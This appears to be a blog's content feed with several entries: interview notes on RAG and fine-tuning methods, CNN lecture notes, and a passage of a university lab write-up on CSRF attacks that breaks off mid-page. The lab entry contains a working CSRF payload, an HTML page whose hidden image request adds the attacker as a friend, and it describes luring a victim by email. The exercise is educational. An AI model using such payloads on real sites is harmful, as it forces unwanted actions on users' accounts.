keyword-similar but semanticallyunrelated.</li><li><strong>Context Break</strong>: Chunking may cut off an importantsentence, leading to incomplete information.</li></ul></li></ul><h3 id="advanced-rag-preprocessing-postprocessing">Advanced RAG(Preprocessing + Postprocessing)</h3><p>To address the pain points of simple retrieval, a large number ofoptimization strategies are added at both ends of the retrievalprocess:</p><ul><li><strong>Preprocessing (Pre-Retrieval)</strong>:<ul><li><strong>Query Rewriting</strong>: If the user’s question is vague,first let the LLM rewrite the question to be clearer or generatemultiple variants (Multi-Query).</li><li><strong>Hypothetical Answer (HyDE)</strong>: First, let the LLMguess an answer, using this “hypothetical answer” to search, which isoften more accurate than searching directly with the “question.”</li></ul></li><li><strong>Postprocessing (Post-Retrieval)</strong>:<ul><li><strong>Re-ranking</strong>: After vector search retrieves 100results, use a more precise model (Cross-Encoder) to select the 5 mostrelevant ones.</li><li><strong>Context Compression</strong>: Simplify lengthy retrievedtexts to retain only key information, preventing the LLM from “gettinglost in the middle.”</li></ul></li></ul><h3 id="modular-rag-modular-composition">Modular RAG (ModularComposition)</h3><p>This is the current cutting-edge form, which is no longer linear but<strong>atomic and plugin-based</strong>.</p><ul><li><strong>Core Logic</strong>: Decomposing RAG into differentfunctional modules that can be flexibly combined based on taskrequirements.</li><li><strong>Examples of New Modules</strong>:<ul><li><strong>Search Module</strong>: Not only searches the vectordatabase but can also search Google or enterprise knowledge graphs.</li><li><strong>Memory Module</strong>: Remembers the user’s previousconversational habits.</li><li><strong>Rewrite/Route Module</strong>: Automatically decides whetherto query the database or generate directly based on the questiontype.</li></ul></li><li><strong>Features</strong>: Supports <strong>iteration</strong> and<strong>loops</strong>. For example, if a search reveals insufficientinformation, it will automatically trigger the “re-search” module untilenough information is gathered.</li></ul><table><colgroup><col style="width: 19%" /><col style="width: 17%" /><col style="width: 30%" /><col style="width: 32%" /></colgroup><thead><tr class="header"><th><strong>Dimension</strong></th><th><strong>Naive RAG</strong></th><th><strong>Advanced RAG</strong></th><th><strong>Modular RAG</strong></th></tr></thead><tbody><tr class="odd"><td><strong>Process</strong></td><td>Linear (Straight)</td><td>Linear + Pre/Post Enhancements</td><td>Modular, Non-linear (e.g., loops, branches)</td></tr><tr class="even"><td><strong>Core Technology</strong></td><td>Vector Retrieval</td><td>Re-ranking, Query Transformation</td><td>Intelligent Routing, Multi-source Fusion</td></tr><tr class="odd"><td><strong>Pain Points Addressed</strong></td><td>Achieved from scratch</td><td>Addressed retrieval noise and semantic alignment</td><td>Solved complex tasks and long process issues</td></tr></tbody></table><h3 id="multimodal-rag-implementation">Multimodal RAGImplementation</h3><ul><li><strong>Implementation Frameworks</strong>: LlamaIndex, LangChain(Multi-modal), Unstructured.io.</li><li><strong>Pseudo-Multimodal RAG</strong>: Achieved through<strong>Captioning</strong>. Converts images/videos into textualdescriptions and stores them in traditional text vector databases.<ul><li><strong>Difference</strong>: Pseudo-multimodal loses visual details;true multimodal matches directly in a unified vector space (MultimodalEmbedding).</li></ul></li><li><strong>Role of CLIP</strong>: Serves as the foundation of<strong>true multimodal RAG</strong>. It achieves representation ofimages and text in the same feature space through image-text pairingtraining, suitable for “searching images with text” or “searching imageswith images.”</li></ul><h2id="how-to-evaluate-rag-what-is-the-most-important-aspect-of-the-rag-evaluation-system">3.How to Evaluate RAG; What is the Most Important Aspect of the RAGEvaluation System</h2><p>The core of the evaluation system is the <strong>RAGTriad</strong>:</p><ol type="1"><li><strong>Faithfulness</strong>: Does the answer come from theretrieved context?</li><li><strong>Answer Relevance</strong>: Does the answer address thequery?</li><li><strong>Context Precision</strong>: Does the retrieved informationcontain the correct answer?</li></ol><h2id="what-are-the-pain-points-of-traditional-rag-introduce-graphrag-what-are-the-challenges-of-graphrag-how-does-graphrag-handle-incremental-scenarios">4.What are the Pain Points of Traditional RAG; Introduce GraphRAG, Whatare the Challenges of GraphRAG; How Does GraphRAG Handle IncrementalScenarios</h2><h3 id="pain-points-of-traditional-rag">Pain Points of TraditionalRAG</h3><ul><li><strong>Poor Global Understanding</strong>: Difficult to answermacro questions like “What is the main idea of this document?”</li><li><strong>Weak Long-range Associations</strong>: Unable to connectimplicit entity relationships across documents and paragraphs.</li></ul><h3 id="graphrag">GraphRAG</h3><ul><li><strong>Challenges</strong>: The cost of building the graph isextremely high (LLM extraction of entity relationships istime-consuming); schema design is complex.</li><li><strong>Incremental Scenarios</strong>: Achieved through<strong>Graph Consolidation</strong>. When new entities enter, use LLMfor entity disambiguation, merging duplicate nodes and updating existingcluster summaries.</li></ul><h2id="introduce-the-responsibilities-of-fine-tuning-what-is-the-most-important-aspect-of-fine-tuning-large-models">5.Introduce the Responsibilities of Fine-tuning; What is the MostImportant Aspect of Fine-tuning Large Models</h2><p><strong>Responsibilities</strong>: Domain knowledge injection, formatalignment (Instruction Following), style transfer.</p><p><strong>Most Important Aspect</strong>: <strong>DataQuality</strong>. As stated in the LIMA paper: <em>Less Is More forAlignment</em>, 1000 high-quality data points far outweigh 100,000 dirtydata points.</p><h2id="what-are-the-methods-of-post-training-what-are-the-methods-of-fine-tuning-how-are-they-done-lora-principles-and-parameter-count">6.What are the Methods of Post-training; What are the Methods ofFine-tuning, How are They Done; LoRA Principles and Parameter Count</h2><h3 id="post-training-methods">Post-training Methods</h3><table><colgroup><col style="width: 14%" /><col style="width: 11%" /><col style="width: 25%" /><col style="width: 26%" /><col style="width: 21%" /></colgroup><thead><tr class="header"><th><strong>Stage / Method</strong></th><th><strong>Core Objective</strong></th><th><strong>Core Approach</strong></th><th><strong>Pros and Cons Analysis</strong></th><th><strong>Applicable Scenarios</strong></th></tr></thead><tbody><tr class="odd"><td><strong>1. Supervised Fine-tuning (SFT)</strong></td><td>Teach the model to converse and follow instructions</td><td>Supervised training using <span class="math inline">\((Prompt,Response)\)</span> data pairs.</td><td><strong>Pros</strong>: Quick results, foundational forconversational ability. <strong>Cons</strong>: Difficult to addressvalue preference issues.</td><td>Basic conversational ability building, specific format alignment(e.g., JSON).</td></tr><tr class="even"><td><strong>2. Continuous Pre-training (CPT)</strong></td><td>Inject domain knowledge</td><td>Train on pure text in specific domains using Next TokenPrediction.</td><td><strong>Pros</strong>: Significantly enhances industry knowledge.<strong>Cons</strong>: Does not change interaction patterns, highcomputational cost.</td><td>Building expert models in vertical domains like healthcare, law,finance.</td></tr><tr class="odd"><td><strong>3. Reinforcement Learning (RLHF - PPO)</strong></td><td>Extreme human preference alignment</td><td>Train a reward model (RM) and update the policy using PPOalgorithm.</td><td><strong>Pros</strong>: High ceiling, makes the model “smarter” andsafer. <strong>Cons</strong>: Extremely complex process, requires threemodels to run simultaneously, training is very unstable.</td><td>Final refinement of top closed-source/open-source models (e.g.,GPT-4, Llama 3).</td></tr><tr class="even"><td><strong>4. Direct Preference Optimization (DPO)</strong></td><td>Efficient preference alignment</td><td>Abandon the reward model, directly calculate loss on (best answer,worst answer) pairs.</td><td><strong>Pros</strong>: Simple, stable, low memory usage, currentlythe most mainstream. <strong>Cons</strong>: Sensitive to datadistribution.</td><td>Most enterprise-level conversational models and fine-tuningprojects.</td></tr><tr class="odd"><td><strong>5. Modular Fine-tuning (LoRA / PEFT)</strong></td><td>Low-cost task adaptation</td><td>Freeze original parameters and only train low-rank matrices (RankDecomposition) in the bypass.</td><td><strong>Pros</strong>: Extremely small parameter count (&lt;1%),very low memory requirements. <strong>Cons</strong>: Performance ceilingslightly lower than full fine-tuning.</td><td>Adaptation for downstream tasks under computational constraints,multi-task switching.</td></tr><tr class="even"><td><strong>6. Hybrid Optimization (ORPO)</strong></td><td>One-step alignment</td><td>Combine SFT and alignment without needing a reference model.</td><td><strong>Pros</strong>: Extremely simple process, high computationalefficiency. <strong>Cons</strong>: Relatively new technology, lesscommunity accumulation.</td><td>Lightweight projects pursuing extreme training efficiency.</td></tr></tbody></table><h3 id="fine-tuning-methods">Fine-tuning Methods</h3><ul><li><strong>Full Fine-tuning</strong>: Full parameter fine-tuning, goodresults but extremely high computational cost.</li><li><strong>PEFT (Parameter-Efficient Fine-tuning)</strong>: Such asLoRA, P-Tuning, Adapter.</li></ul><h3 id="lora-principles">LoRA Principles</h3><p>Parallel two low-rank matrices <span class="math inline">\(A\)</span>and <span class="math inline">\(B\)</span> next to the pre-trainedweights. <span class="math display">\[W_{new} = W_{base} + \Delta W = W_{base} + A \times B\]</span> <strong>Parameter Count</strong>: Extremely small, usuallyless than 1% of the original model. The calculation formula is <spanclass="math inline">\(2 \times r \times d_{model}\)</span> (where <spanclass="math inline">\(r\)</span> is the rank).</p><h2 id="introduce-dpo-what-is-the-difference-between-dpo-and-ppo">7.Introduce DPO; What is the Difference Between DPO and PPO</h2><h3 id="ppo-principles">PPO Principles</h3><p><strong>PPO (Reinforcement Learning from Human Feedback)</strong>:Requires training a <strong>Reward Model</strong>, updating the policythrough policy gradient. The process is complex and training is veryunstable.</p><h3 id="why-is-ppo-training-unstable">Why is PPO Training Unstable?</h3><ul><li><strong>Credit Assignment Problem</strong>: An LLM generates asentence containing dozens of tokens, but the reward is usually given asa total score only at the end. PPO finds it difficult to accuratelydetermine which word led to a high or low score, and this “sparsefeedback” causes gradient updates to oscillate.</li><li><strong>Dual Distribution Drift</strong>: PPO involves two dynamicsystems: one is the <strong>policy model</strong> changing, and theother is the <strong>value model</strong> chasing. If the value modelestimates inaccurately, the advantage function provided will mislead thepolicy model, causing training to collapse instantly.</li><li><strong>Non-stationarity and KL Penalty</strong>: To prevent themodel from deviating, PPO must include a KL divergence constraint.However, this coefficient is very difficult to tune—if set too high, themodel does not learn (does not update), and if set too low, the modeloutputs gibberish (Reward Hacking).</li></ul><h3 id="core-essence-of-dpo-and-orpo">Core Essence of DPO and ORPO</h3><p><strong>DPO (Direct Preference Optimization)</strong></p><ul><li><strong>Core Principle</strong>: Utilizes mathematical techniques totransform the alignment problem originally requiring “reinforcementlearning” into a <strong>“lookup comparison”</strong> problem.<strong>No reward model needed</strong>. It directly performs maximumlikelihood estimation on preference data, converting the reinforcementlearning objective into simple binary cross-entropy loss. Simpler, morestable, and efficient.</li><li><strong>Why Stable</strong>: It establishes an analytical solution,proving that <strong>the optimal policy model is proportional to thelogit probabilities it generates</strong>. During training, as long asthe probability increase for “good answers” is <strong>greaterthan</strong> that for “bad answers,” the model evolves. It does notinvolve complex sampling and scoring processes; it is essentially<strong>contrastive learning</strong>.</li></ul><p><strong>ORPO (Odds Ratio Preference Optimization)</strong></p><ul><li><strong>Core Principle</strong>: Directly modifies the loss functionof SFT. It believes that the model should not only learn “what to say”but also “what not to say.”</li><li><strong>Core Logic</strong>:<ol type="1"><li><strong>Weaken Negative Samples</strong>: It directly penalizes theprobability of generating negative samples (Rejected) using the<strong>Odds Ratio</strong> statistical measure.</li><li><strong>Single-stage Alignment</strong>: It does not require thefour models of PPO, nor does it need the reference model of DPO, relyingsolely on one model to simultaneously complete “knowledge learning” and“preference selection” during the SFT process.</li></ol></li></ul><h2id="introduce-some-agent-implementation-frameworks-what-are-the-differences-between-these-frameworks-what-scenarios-is-langgraph-suitable-for-what-are-the-ways-to-build-agents-with-langgraph">8.Introduce Some Agent Implementation Frameworks; What are the DifferencesBetween These Frameworks; What Scenarios is LangGraph Suitable For; Whatare the Ways to Build Agents with LangGraph</h2><ul><li><strong>Frameworks</strong>: AutoGPT (autonomous navigation), CrewAI(multi-role collaboration), LangGraph (cyclic flow control).</li><li><strong>Advantages of LangGraph</strong>: Supports<strong>Stateful</strong> and <strong>Cyclic</strong>. TraditionalLangChain is a DAG (Directed Acyclic Graph), which struggles to handlecomplex logic that requires repeated iterations and corrections.</li><li><strong>Building Methods</strong>: 1. <strong>StateGraph</strong>(explicit state definition); 2. <strong>Nodes &amp; Edges</strong>(logical nodes and edges).</li></ul><h2id="scenario-question-a-customer-inputs-a-screenshot-of-a-software-or-web-interface-how-to-help-users-understand-the-function-of-each-component-of-the-interface-through-rag-honestly-i-didnt-quite-understand-define-input-and-output-yourself-how-to-distinguish-similar-components-like-image-boxes-and-video-boxes">9.Scenario Question: A Customer Inputs a Screenshot of a Software or WebInterface, How to Help Users Understand the Function of Each Componentof the Interface Through RAG (??? Honestly, I didn’t quite understand),Define Input and Output Yourself; How to Distinguish Similar ComponentsLike Image Boxes and Video Boxes</h2><h3 id="solution-definition">Solution Definition</h3><ul><li><strong>Input</strong>: Interface screenshot + target componentlocation (Bounding Box) or coordinates.</li><li><strong>Output</strong>: Function description and interaction logicof the component.</li><li><strong>Implementation Process</strong>:<ol type="1"><li><strong>Preprocessing</strong>: Use a multimodal model (e.g., GPT-4oor dedicated OCR + object detection model) to extract elements from thescreenshot.</li><li><strong>Indexing</strong>: Store the features of the components(visual features + location information + associated text) in a vectordatabase.</li><li><strong>Retrieval</strong>: When the user clicks or inputs alocation, calculate the overlap of coordinates or featuresimilarity.</li><li><strong>Generation</strong>: Generate descriptions by combining thecomponent’s documentation (Context).</li></ol></li></ul><h3id="distinguishing-similar-components-image-box-vs-video-box">DistinguishingSimilar Components (Image Box vs Video Box)</h3><ol type="1"><li><strong>Multimodal Features</strong>: Video boxes typically comewith play button features (triangle icon) and progress barfeatures.</li><li><strong>Code/Metadata</strong>: If extracted from the code layer,check the differences between <code>&lt;img&gt;</code> tags and<code>&lt;video&gt;</code> or <code>&lt;iframe&gt;</code> tags.</li><li><strong>Temporal Analysis</strong>: If it is dynamic input, thevideo box will have frame rate changes, while the image box remainsstatic.</li></ol><p><ahref="https://www.xiaohongshu.com/explore/69188729000000000503bb66?app_platform=ios&amp;app_version=9.12.2&amp;share_from_user_hidden=true&amp;xsec_source=app_share&amp;type=normal&amp;xsec_token=CBO_gMH8TYsZlSZ4cVu3YNidnacfVrk2ZnNVz1MuchRRk=&amp;author_share=1&amp;xhsshare=WeixinSession&amp;shareRedId=ODxFMjU-Sk42NzUyOTgwNjdHOTo2Rj1K&amp;apptime=1765672895&amp;share_id=d1250146cbed4d6287b12a57fcc72633">OriginalLink</a></p>]]></content>
      
      
      <categories>
          
          <category> Interview Experience </category>
          
      </categories>
      
      
        <tags>
            
            <tag> AI Agent </tag>
            
            <tag> 面经 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CNNs - Part 2</title>
      <link href="/2025/10/03/Deep-Learning/CNN_P2/"/>
      <url>/2025/10/03/Deep-Learning/CNN_P2/</url>
      
        <content type="html"><![CDATA[<h1 id="convolutional-neural-networks-cnn---part-2">Convolutional NeuralNetworks (CNN) - Part 2</h1><h2 id="appendix">Appendix</h2><ul><li><ahref="https://deeplearning.cs.cmu.edu/F25/document/slides/lec9.CNN1.pdf">CNN1Slides</a></li><li><ahref="https://deeplearning.cs.cmu.edu/F25/document/slides/lec10.CNN2.pdf">CNN2Slides</a></li><li><ahref="https://deeplearning.cs.cmu.edu/F25/document/slides/lec11.CNN3.pdf">CNN3Slides</a></li><li><ahref="https://deeplearning.cs.cmu.edu/F25/document/slides/lec12.CNN4.pdf">CNN4Slides</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Deep Learning </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Study Notes </tag>
            
            <tag> Deep Learning </tag>
            
            <tag> CNN </tag>
            
            <tag> CMU 11-785 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CNNs - Part 1</title>
      <link href="/2025/10/02/Deep-Learning/CNN_P1/"/>
      <url>/2025/10/02/Deep-Learning/CNN_P1/</url>
      
        <content type="html"><![CDATA[<h1 id="convolutional-neural-networks-cnn---part-1">Convolutional NeuralNetworks (CNN) - Part 1</h1><p>Firstly, we know some facts about MLPs (Multi-Layer Perceptrons):</p><ul><li>MLPs are universal function approximators. (Boolean functions,classifiers, and regressions)</li><li>MLPs can be trained through variations of gradient descent</li></ul><p>But how do we meet the <strong>need of shift invariance</strong>,conventional MLPs are sensitive to the location of the pattern,resulting in a very large network to cover all possible locations of thepattern. So CNNs are introduced.</p><p>There are two scenarios in this lecture:</p><ol type="1"><li>1D input (e.g., time series)</li><li>2D input (e.g., images)</li></ol><h2 id="regular-networks-vs.-scanning-networks">Regular networksvs. Scanning networks</h2><h3 id="regular-networks">Regular networks</h3><figure><imgsrc="https://raw.githubusercontent.com/XLOverflow/blog-image/main/20251002144814402.png"alt="Regular networks" /><figcaption aria-hidden="true">Regular networks</figcaption></figure><p>In a regular MLP, every neuron in the same layer is connnected by aunique weight to every unit in the previous layer.</p><ul><li>All entries in the weight matrix are <strong>unique</strong></li><li>The weight matrix is (generally) full</li></ul><h3 id="scanning-networks">Scanning networks</h3><figure><imgsrc="https://raw.githubusercontent.com/XLOverflow/blog-image/main/Screenshot%202025-10-02%20at%2014.50.47.png"alt="Scanning networks" /><figcaption aria-hidden="true">Scanning networks</figcaption></figure><p>In a scanning MLP each neuron is connected to a subset of neurons inthe previous layer.</p><ul><li>The weight matrix is sparse</li><li>The weights matrix is block structured with <strong>identicalblocks</strong></li><li>The network is a <strong>shared parameter model</strong></li></ul><div class="note info flat"><p>Scanning Networks are our focus in this lecture.</p></div><h2 id="learning-in-shared-parameter-model">Learning in shared parametermodel</h2><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/20251002150101208.png" alt="Shared parameter model" width="30%"/></p><h3 id="shared-parameters">1) Shared Parameters</h3><p>Multiple connections are constrained to have the same parameter:<span class="math display">\[    w_{ij}^k = w_{mn}^l = w^s    \]</span></p><p>For any training instance <span class="math inline">\(X\)</span>, asmall perturbation of <span class="math inline">\(w^s\)</span> willsimultaneously perturb both <spanclass="math inline">\(w_{ij}^k\)</span> and <spanclass="math inline">\(w_{mn}^l\)</span>. Each of these perturbationswill individually influence the final divergence (loss):<br /><span class="math display">\[    Div(d, y)    \]</span></p><p>The gradient with respect to the shared parameter <spanclass="math inline">\(w^s\)</span> equals the sum of the gradients withrespect to each shared weight:<br /><span class="math display">\[    \frac{\partial Div}{\partial w^s}    = \frac{\partial Div}{\partial w_{ij}^k} \cdot \frac{\partialw_{ij}^k}{\partial w^s}    + \frac{\partial Div}{\partial w_{mn}^l} \cdot \frac{\partialw_{mn}^l}{\partial w^s}    \]</span> Since <span class="math inline">\(w_{ij}^k = w_{mn}^l =w^s\)</span>, this simplifies to:<br /><span class="math display">\[    \frac{\partial Div}{\partial w^s}    = \frac{\partial Div}{\partial w_{ij}^k}    + \frac{\partial Div}{\partial w_{mn}^l}    \]</span> z In conclusion, the gradient with respect to a sharedparameter <strong>is the sum of the gradients with respect to each ofits instances</strong>.</p><h3 id="gradient-of-shared-parameters">2) Gradient of SharedParameters</h3><p><span class="math inline">\(S = \{e_1, e_2, ..., e_N\}\)</span> is aset of shared edges. So the total gradient is the sum over all edges inthe set:<br /><span class="math display">\[    \frac{\partial Div}{\partial w^s}    = \sum_{e \in S} \frac{\partial Div}{\partial w^e}    \]</span></p><p>Then the loss gradient w.r.t. <spanclass="math inline">\(w^s\)</span> is <span class="math display">\[\nabla_S \mathrm{Loss}= \frac{\partial \mathrm{Loss}}{\partial w^s}= \sum_{e \in S} \frac{\partial \mathrm{Loss}}{\partial w^{e}}.\]</span></p><h3 id="gradient-descent-update">3) Gradient Descent Update</h3><p>With learning rate <span class="math inline">\(\eta\)</span>, updatethe shared parameter: <span class="math display">\[w^s \leftarrow w^s - \eta \ \nabla_S \mathrm{Loss}.\]</span></p><p>After updating, write the new shared value back to every tied weight:<span class="math display">\[\forall (k,i,j)\in S:\quad w^{(k)}_{i,j} \leftarrow w^s.\]</span></p><h3 id="training-loop">4) Training Loop</h3><ol type="1"><li>Initialize all weights $ _1, _2, , _K $.</li><li>For each tied set <span class="math inline">\(S\)</span>:<ul><li>Backprop to get $ $ for each edge <span class="math inline">\(e\inS\)</span>.</li><li>Sum to obtain $ _S $.</li><li>Update $ w^s w^s - , _S $.</li><li>Sync the updated $ w^s $ back to all $ w^{(k)}_{i,j} S $.</li></ul></li><li>Repeat until the loss converges.</li></ol><h2 id="distributed-vs-non-distributed-scanning">Distributed vsNon-distributed Scanning</h2><h3 id="definition">Definition</h3><ul><li><strong>Distributed scanning</strong>: Parameters (weights) are<strong>shared across spatial positions</strong>.<br />→ Example: convolution kernels reused at every location.</li><li><strong>Non-distributed scanning</strong>: Parameters are<strong>not shared</strong>; each location/block has its own set ofweights.</li></ul><h3 id="key-differences">Key Differences</h3><ul><li><strong>Parameter sharing</strong>: Distributed ✅ | Non-distributed❌</li><li><strong>Parameter count</strong>:<ul><li>Distributed: Independent of number of positions; fewer parameters.<ul><li>Formula: <span class="math inline">\(K_0 D N_1 + K_1 N_1 N_2 + N_2N_3\)</span></li></ul></li><li>Non-distributed: Grows linearly with the number of positions(replicated per location).</li></ul></li><li><strong>Inductive bias</strong>:<ul><li>Distributed: Enforces <strong>translationequivariance/invariance</strong>.<br /></li><li>Non-distributed: No such bias; more flexible but prone tooverfitting.</li></ul></li><li><strong>Output arrangement</strong>:<ul><li>Distributed: Naturally produces feature maps aligned with the inputgrid.<br /></li><li>Non-distributed: Not required to follow the same shape (can justcollect outputs).</li></ul></li><li><strong>Efficiency</strong>:<ul><li>Distributed: Fewer parameters, better generalization, cheaper inmemory/compute.<br /></li><li>Non-distributed: Many more parameters, expensive, lessscalable.</li></ul></li><li><strong>Implementation analogy</strong>:<ul><li>Distributed ≈ Convolution (shared kernels).<br /></li><li>Non-distributed ≈ Independent MLPs applied at each location.</li></ul></li></ul><h3 id="one-liner">One-liner</h3><p>The <strong>essence</strong>: Distributed vs non-distributed scanningdiffers in whether weights are <strong>shared across positions</strong>— which directly impacts parameter count, generalization, andefficiency.</p><h2 id="terminology-in-cnns">Terminology in CNNs</h2><figure><imgsrc="https://raw.githubusercontent.com/XLOverflow/blog-image/main/20251002164429959.png"alt="Convolutional Neural Network" /><figcaption aria-hidden="true">Convolutional Neural Network</figcaption></figure><p><strong>Filter (Kernel)</strong>: A learned weight tensor <spanclass="math inline">\(W_c \in \mathbb{R}^{K_h \times K_w \timesC_{\text{in}}}\)</span> reused at every location; output at <spanclass="math inline">\((u,v,c)\)</span>: <spanclass="math inline">\(y(u,v,c)=\sigma(\langle \text{patch}(u,v),W_c\rangle + b_c)\)</span>.</p><p><strong>Receptive Field</strong>: The input region that affects aneuron’s output; per layer (1D) <spanclass="math inline">\(r_l=r_{l-1}+(k_l-1)\,d_l\,j_{l-1}\)</span>, <spanclass="math inline">\(j_l=j_{l-1}s_l\)</span> with <spanclass="math inline">\(r_0=1, j_0=1\)</span>.</p><p><strong>Stride</strong>: The step size when sliding the filter overthe input; larger strides reduce output size.</p><figure><imgsrc="https://raw.githubusercontent.com/XLOverflow/blog-image/main/20251002165111427.png"alt="Flattening" /><figcaption aria-hidden="true">Flattening</figcaption></figure><p><strong>Flattening</strong>: reshape the final feature maps fromshape <span class="math inline">\(H \times W \times C\)</span> into a1-D vector of length <span class="math inline">\(HWC\)</span> (persample) before feeding a fully connected/softmax layer.</p><div class="note info flat"><p><strong>With a classification head</strong>: train for<strong>classification</strong> by feeding the embedding <spanclass="math inline">\(z\)</span> into a linear layer + softmax(cross-entropy), predicting an ID among <spanclass="math inline">\(C\)</span> classes. <strong>Without aclassification head</strong>: for <strong>verification</strong>, dropthe linear/softmax and compare two embeddings <spanclass="math inline">\(z_1,z_2\)</span> with a similarity (e.g., cosine)to decide <strong>match vs non-match</strong> (threshold/EER).</p></div><figure><imgsrc="https://raw.githubusercontent.com/XLOverflow/blog-image/main/20251002170855251.png"alt="Pooling" /><figcaption aria-hidden="true">Pooling</figcaption></figure><p><strong>Pooling</strong>: downsample local neighborhoods afterconv;</p><ul><li><strong>max</strong>: <spanclass="math inline">\(y=\max(x_1,\dots,x_K)\)</span> keeps strongestresponse;</li><li><strong>avg</strong>: <spanclass="math inline">\(y=\tfrac{1}{K}\sum_{i=1}^K x_i\)</span>smooths;</li></ul><p>both reduce spatial size (stride <spanclass="math inline">\(&gt;1\)</span>) and add small shift/jitterinvariance.</p><h2 id="summary">Summary</h2><figure><imgsrc="https://raw.githubusercontent.com/XLOverflow/blog-image/main/20251002171028845.png"alt="Overall CNN Architecture" /><figcaption aria-hidden="true">Overall CNN Architecture</figcaption></figure><ul><li>NN learn patterns hierarchically (simple → complex).<br /></li><li>Pattern tasks = scan for target with a<strong>shared-parameter</strong> net (like CNN).<br /></li><li>First layer scans input; higher layers scan previous<strong>maps</strong>; final layer makes decision.<br /></li><li>Scanning can be distributed across layers; optional<strong>pooling</strong> adds small-shift invariance.<br /></li><li>2-D scans → <strong>convnet</strong>; 1-D along time →<strong>TDNN</strong>.</li></ul><h2 id="appendix">Appendix</h2><ul><li><ahref="https://deeplearning.cs.cmu.edu/F25/document/slides/lec9.CNN1.pdf">CNN1Slides</a></li><li><ahref="https://deeplearning.cs.cmu.edu/F25/document/slides/lec10.CNN2.pdf">CNN2Slides</a></li><li><ahref="https://deeplearning.cs.cmu.edu/F25/document/slides/lec11.CNN3.pdf">CNN3Slides</a></li><li><ahref="https://deeplearning.cs.cmu.edu/F25/document/slides/lec12.CNN4.pdf">CNN4Slides</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> Deep Learning </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Study Notes </tag>
            
            <tag> Deep Learning </tag>
            
            <tag> CNN </tag>
            
            <tag> CMU 11-785 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HUST Information System Security Lab3-Web Security</title>
      <link href="/2024/09/26/HUST-Labs/HUST%20Information%20System%20Security%20Lab3-Web%20Security/"/>
      <url>/2024/09/26/HUST-Labs/HUST%20Information%20System%20Security%20Lab3-Web%20Security/</url>
      
        <content type="html"><![CDATA[<h1 id="information-system-security-lab3-record">Information SystemSecurity Lab3 Record</h1><h2id="cross-site-request-forgery-csrf-attack-experiment"><strong>Cross-SiteRequest Forgery (CSRF) Attack Experiment</strong></h2><h3 id="task-1-csrf-attack-based-on-get-request"><strong>Task 1: CSRFAttack Based on GET Request</strong></h3><p>Use samy to log in, send add friend command, get url. HTTP HeaderLive plugin window captured the packet as shown in the figure:</p><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619220223319.png"alt="image-20240619220223319" /><figcaption aria-hidden="true">image-20240619220223319</figcaption></figure><p>Thus we can know the GET request structure ishttp://www.csrflabelgg.com/action/friends/add?friend=id, so now we needto get Samy’s ID number. We can see the red highlighted part 45 isSamy’s ID by trying to create a new interface for Samy.</p><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619221713999.png"alt="image-20240619221713999" /><figcaption aria-hidden="true">image-20240619221713999</figcaption></figure><p>Create get_csrf.html under Attacker site</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo touch /var/www/CSRF/Attacker/get_csrf.html</span><br></pre></td></tr></table></figure><p>Write the following content</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>CSRF_GET<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    Alice, you&#x27;re my friend now!</span><br><span class="line">    <span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;http://www.csrflabelgg.com/action/friends/add?friend=45&quot;</span>/&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span>  </span><br></pre></td></tr></table></figure><p>Samy sends Alice an email, inducing Alice to click the malicious linkhttp://www.csrflabattacker.com/get_csrf.html</p><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619224208937.png"alt="image-20240619224208937" /><figcaption aria-hidden="true">image-20240619224208937</figcaption></figure><p>Log in to Alice’s account to view the email and access the maliciouswebpage, captured the GET request packet adding user id 45, which isSamy, then check the Activity interface and found that Alice added Samyas a friend.</p><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619224651139.png"alt="image-20240619224651139" /><figcaption aria-hidden="true">image-20240619224651139</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619224818367.png"alt="image-20240619224818367" /><figcaption aria-hidden="true">image-20240619224818367</figcaption></figure><figure><imgsrc="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240619224859567.png"alt="image-20240619224859567" /><figcaption 